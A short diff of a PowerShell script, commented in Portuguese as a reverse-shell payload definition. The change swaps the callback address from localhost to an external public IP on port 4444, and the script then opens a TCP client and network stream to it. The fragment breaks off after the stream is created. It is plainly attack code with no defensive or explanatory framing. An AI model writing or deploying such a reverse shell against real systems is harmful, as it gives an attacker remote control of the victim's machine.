@@ -1,6 +1,6 @@
 # Define Payload de Shell-Reverso
 $x = @'
-$ip = '127.0.0.1';
+$ip = '179.106.231.154';
 $port = 4444;
 $TCPClient = New-Object Net.Sockets.TCPClient($ip, $port);
 $NetworkStream = $TCPClient.GetStream();
